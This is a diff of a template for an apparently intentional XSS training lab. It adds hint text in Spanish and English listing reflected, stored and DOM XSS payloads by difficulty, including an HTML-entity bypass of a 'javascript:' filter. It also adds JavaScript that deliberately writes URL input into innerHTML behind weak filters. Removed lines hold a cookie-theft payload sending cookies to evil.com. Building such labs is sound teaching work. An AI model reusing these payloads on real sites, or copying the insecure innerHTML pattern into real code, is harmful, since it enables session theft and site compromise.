@@ -62,9 +62,21 @@
   <!-- DOM -->
   {% if tab == 'dom' %}
   <div class="hl-card mb-4">
-    <div class="text-xs text-gray-400 mb-2" data-i18n="xss_dom_label">Salida dinámica (desde fragmento URL):</div>
-    <div id="dom-output" class="hl-code text-sm text-gray-700 dark:text-gray-300">
-      <span data-i18n="xss_dom_hint">Añade un fragmento a la URL:</span> <code>#&lt;img src=x onerror=alert(1)&gt;</code>
+    <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">
+      <span data-i18n="xss_dom_desc">Esta página genera un mensaje de bienvenida leyendo el parámetro <code>name</code> de la URL con JavaScript. El servidor no procesa este valor — todo ocurre en el lado del cliente.</span>
+    </p>
+    <form id="dom-form" class="flex gap-3 mb-4">
+      <input type="text" id="dom-input" placeholder='&lt;img src=x onerror=alert(1)&gt;'
+             class="flex-1 hl-input font-mono" />
+      <button type="submit" class="btn-primary flex-shrink-0" data-i18n="xss_dom_greet">Saludar</button>
+    </form>
+    <div class="hl-code text-sm">
+      <div id="dom-output">
+        <span class="text-gray-400" data-i18n="xss_dom_hint2">Introduce un nombre o añade <code>?name=valor</code> a la URL</span>
+      </div>
+    </div>
+    <div class="text-xs text-gray-400 mt-2">
+      Source: <code>URLSearchParams</code> / <code>location.hash</code> → Sink: <code>innerHTML</code>
     </div>
   </div>
   {% endif %}
@@ -75,19 +87,29 @@
     <h3>XSS Reflejado</h3>
     <ol>
       <li>El parámetro <code>q</code> se refleja con <code>|safe</code> en Jinja2 — cualquier HTML/JS se ejecuta.</li>
-      <li>Payload básico: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
-      <li>Payload de robo de cookies: <code>&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</code></li>
+      <li><strong>Easy:</strong> <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+      <li><strong>Medium:</strong> Filtra <code>&lt;script&gt;</code> tags. Bypass con event handlers:
+        <pre>&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(document.cookie)&gt;</pre></li>
+      <li><strong>Hard:</strong> Reemplaza <code>&lt;</code> y <code>&gt;</code> por entidades HTML. XSS bloqueado — usa XSStrike para análisis avanzado.</li>
     </ol>
     <h3>XSS Almacenado</h3>
     <ol>
-      <li>Publica un comentario con: <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code></li>
-      <li>El payload se guarda en BD y se ejecuta cada vez que alguien visita la página.</li>
-      <li>Payload de desfiguración: <code>&lt;style&gt;body{display:none}&lt;/style&gt;&lt;h1&gt;Hacked&lt;/h1&gt;</code></li>
+      <li><strong>Easy:</strong> Publica un comentario con: <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code></li>
+      <li><strong>Medium:</strong> Filtra <code>&lt;script&gt;</code>. Bypass: <code>&lt;img src=x onerror=alert(1)&gt;</code> en el cuerpo del comentario.</li>
+      <li><strong>Hard:</strong> Reemplaza <code>&lt;</code> y <code>&gt;</code> — XSS bloqueada.</li>
     </ol>
     <h3>XSS DOM-based</h3>
     <ol>
-      <li>Añade un fragmento a la URL (el servidor no lo ve): <code>/xss/dom#&lt;img src=x onerror=alert(1)&gt;</code></li>
-      <li>El JS de la página usa <code>innerHTML</code> con <code>window.location.hash</code> sin sanitizar.</li>
+      <li>El JS de la página lee <code>?name=</code> o <code>#hash</code> y lo inyecta con <code>innerHTML</code>. El servidor nunca ve el payload.</li>
+      <li><strong>Easy:</strong> Sin filtro. Nota: <code>&lt;script&gt;</code> no se ejecuta vía innerHTML. Usa event handlers:
+        <pre>/xss/dom?name=&lt;img src=x onerror=alert(1)&gt;
+/xss/dom#&lt;svg onload=alert(document.cookie)&gt;</pre></li>
+      <li><strong>Medium:</strong> JS filtra <code>&lt;script&gt;</code> tags. Mismos payloads que Easy funcionan:
+        <pre>/xss/dom?name=&lt;img src=x onerror=alert(1)&gt;</pre></li>
+      <li><strong>Hard:</strong> JS filtra tags peligrosos + <code>on*=</code> handlers + <code>javascript:</code>. Bypass con HTML entities:
+        <pre># El filtro busca "javascript:" literal pero &amp;#106; = 'j'
+/xss/dom?name=&lt;a href="&amp;#106;avascript:alert(document.cookie)"&gt;click me&lt;/a&gt;</pre></li>
     </ol>
     <h3>Herramientas</h3>
     <div><span class="tools-badge">browser</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">XSStrike</span></div>
@@ -96,19 +118,29 @@
     <h3>Reflected XSS</h3>
     <ol>
       <li>The <code>q</code> parameter is reflected with <code>|safe</code> in Jinja2 — any HTML/JS executes.</li>
-      <li>Basic payload: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
-      <li>Cookie theft: <code>&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</code></li>
+      <li><strong>Easy:</strong> <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+      <li><strong>Medium:</strong> Filters <code>&lt;script&gt;</code> tags. Bypass with event handlers:
+        <pre>&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(document.cookie)&gt;</pre></li>
+      <li><strong>Hard:</strong> Replaces <code>&lt;</code> and <code>&gt;</code> with HTML entities. XSS blocked — use XSStrike for advanced analysis.</li>
     </ol>
     <h3>Stored XSS</h3>
     <ol>
-      <li>Post a comment with: <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code></li>
-      <li>The payload is stored in the DB and executes every time someone visits the page.</li>
-      <li>Defacement payload: <code>&lt;style&gt;body{display:none}&lt;/style&gt;&lt;h1&gt;Hacked&lt;/h1&gt;</code></li>
+      <li><strong>Easy:</strong> Post: <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code></li>
+      <li><strong>Medium:</strong> Filters <code>&lt;script&gt;</code>. Bypass: <code>&lt;img src=x onerror=alert(1)&gt;</code> in comment body.</li>
+      <li><strong>Hard:</strong> Replaces <code>&lt;</code> and <code>&gt;</code> — XSS blocked.</li>
     </ol>
     <h3>DOM-based XSS</h3>
     <ol>
-      <li>Add a URL fragment (server never sees it): <code>/xss/dom#&lt;img src=x onerror=alert(1)&gt;</code></li>
-      <li>Page JS uses <code>innerHTML</code> with unsanitized <code>window.location.hash</code>.</li>
+      <li>Page JS reads <code>?name=</code> or <code>#hash</code> and injects via <code>innerHTML</code>. Server never sees the payload.</li>
+      <li><strong>Easy:</strong> No filter. Note: <code>&lt;script&gt;</code> doesn't execute via innerHTML. Use event handlers:
+        <pre>/xss/dom?name=&lt;img src=x onerror=alert(1)&gt;
+/xss/dom#&lt;svg onload=alert(document.cookie)&gt;</pre></li>
+      <li><strong>Medium:</strong> JS filters <code>&lt;script&gt;</code> tags. Same payloads as Easy work:
+        <pre>/xss/dom?name=&lt;img src=x onerror=alert(1)&gt;</pre></li>
+      <li><strong>Hard:</strong> JS filters dangerous tags + <code>on*=</code> handlers + <code>javascript:</code>. Bypass with HTML entities:
+        <pre># Filter looks for literal "javascript:" but &amp;#106; = 'j'
+/xss/dom?name=&lt;a href="&amp;#106;avascript:alert(document.cookie)"&gt;click me&lt;/a&gt;</pre></li>
     </ol>
     <h3>Tools</h3>
     <div><span class="tools-badge">browser</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">XSStrike</span></div>
@@ -120,8 +152,53 @@
 {% if tab == 'dom' %}
 <script>
   (function() {
-    var hash = decodeURIComponent(window.location.hash.slice(1));
-    if (hash) document.getElementById('dom-output').innerHTML = 'Fragment value: ' + hash;
+    var difficulty = '{{ difficulty }}';
+
+    function renderName(name) {
+      if (!name) return;
+      if (difficulty === 'medium') {
+        name = name.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, '');
+        name = name.replace(/<script\b[^>]*\/?>/gi, '');
+      } else if (difficulty === 'hard') {
+        name = name.replace(/<(script|iframe|object|embed|svg|math)\b[^>]*>([\s\S]*?)<\/\1>/gi, '');
+        name = name.replace(/<(script|iframe|object|embed|svg|math)\b[^>]*\/?>/gi, '');
+        name = name.replace(/\bon\w+\s*=/gi, 'data-blocked=');
+        name = name.replace(/javascript\s*:/gi, '');
+      }
+      document.getElementById('dom-output').innerHTML =
+        '<span style="color:var(--hl-primary)">\uD83D\uDC4B </span>' +
+        '<span>\u00a1Bienvenido, </span><strong>' + name + '</strong>!';
+    }
+
+    var params = new URLSearchParams(window.location.search);
+    var name = params.get('name');
+    if (name) {
+      document.getElementById('dom-input').value = name;
+      renderName(name);
+    }
+
+    if (window.location.hash && !name) {
+      var hashVal = decodeURIComponent(window.location.hash.slice(1));
+      if (hashVal) {
+        document.getElementById('dom-input').value = hashVal;
+        renderName(hashVal);
+      }
+    }
+
+    document.getElementById('dom-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      var val = document.getElementById('dom-input').value;
+      var url = new URL(window.location);
+      url.searchParams.set('name', val);
+      url.hash = '';
+      window.history.pushState({}, '', url);
+      renderName(val);
+    });
+
+    window.addEventListener('hashchange', function() {
+      var hashVal = decodeURIComponent(window.location.hash.slice(1));
+      if (hashVal) renderName(hashVal);
+    });
   })();
 </script>
 {% endif %}
